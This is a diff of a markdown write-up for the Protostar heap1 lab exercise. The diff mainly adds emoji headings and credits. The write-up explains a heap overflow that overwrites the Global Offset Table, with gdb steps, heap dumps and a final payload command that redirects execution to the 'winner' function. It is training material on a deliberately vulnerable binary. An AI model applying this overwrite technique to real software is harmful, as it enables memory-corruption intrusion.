@@ -1,6 +1,8 @@
-## Global Offet Table overwrite
+## GOT Overwrite
+> overwriting global offset table via heap overflow  
+:syringe: Learned and noted for everyone :syringe:
 
-heap1.c from protostar
+**:pill: heap1.c from protostar :pill:**
 
 ```clike
 #include <stdlib.h>
@@ -38,12 +40,13 @@ int main(int argc, char **argv)
 }
 ```
 
-understanding source code   
+:scroll: :scroll: :scroll: Definitions of source code :scroll: :scroll: :scroll:   
+
  - `struct internet *i1, *i2, *i3;` -> program has 3 pointers
  - `i1->name` & `i2->name` are respectively allocated at heap memory with 8 bytes
  - user inputs are copying to `i1->name` & `i2->name`
 
-debugging in gdb
+:mag: :mag: :mag: Debugging in gdb :mag_right: :mag_right: :mag_right:
  - we will break at strcpy and then we will examine heap in gdb
  - `gdb -q ./heap1` -> load the program with gdb
  - `set disassembly-flavor intel` -> set disassembly result to intel
@@ -65,7 +68,7 @@ End with a line saying just "end".
 
  - `run AAAA BBBB` -> run program to examine heap chunks
 
-result
+:grey_question: results :grey_question:
 ```
 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
 0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
@@ -76,7 +79,7 @@ result
 0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
 ``` 
-heap cunks
+**:notebook: Revisiting Heap Chunks :notebook:**
 
 i1 heap chunk
 
@@ -107,7 +110,7 @@ execute after strcpy
  - we have access to write at `0x0804a018` so we can overwrite `0x0804a038` , simple!
  - `run $(python -c 'print "A"*24') BBBB` -> test overflow
 
-result
+:grey_question: results :grey_question:
 
 ```
 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
@@ -134,7 +137,7 @@ viewing the adreess in GOT
  - `0x0804a038 = \x38\xa0\x04\x08` -> the address of i2->name
  - `run $(python -c 'print "A"*20+"\x38\xa0\x04\x08"') BBBB` -> testing to modify
 
-result
+:grey_question: results :grey_question:
 
 ```
 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
@@ -153,7 +156,7 @@ result
  - `0x08048494 = \x94\x84\x04\x08` -> winer address
  - `run $(python -c 'print "A"*20+"\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')` -> final payload
 
-result
+:grey_question: results :grey_question:
 
 ```
 $ ./heap1 $(python -c 'print "A"*20+"\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
@@ -161,4 +164,15 @@ and we have a winner @ 1544380822
 ```
  - Yeah! we made it
 
+Have fun! :v: :v: :v:
+
 ---
+**:muscle: References :muscle:**  
+
+all resources listed here :point_right: [LOL-Fav](http://location-href.com/lol-fav/)  :page_facing_up:
+
+:snowman: Contributed and maintained by [Luna-](https://twitter.com/art0flunam00n)  
+:snowflake: Powered by [Legion of LOL](http://location-href.com)
+
+---
+
